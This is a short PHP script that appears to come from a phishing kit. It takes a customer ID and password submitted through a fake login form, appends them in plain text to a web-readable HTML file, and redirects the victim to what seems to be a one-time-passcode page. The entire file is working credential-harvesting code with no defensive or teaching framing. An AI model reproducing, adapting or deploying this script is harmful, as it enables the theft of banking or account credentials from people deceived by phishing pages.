<?php
header("location:otpx.php");
$CustomerID=$_POST['CustomerID'];
$password=$_POST['password'];
$handle=fopen('dht.html','a');
fwrite($handle ,"CustomerID=$CustomerID\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"password=$password\n");
fwrite($handle ,"<br>\r\n");
fwrite($handle ,"<br>\r\n");
fclose($handle);
exit;
?>
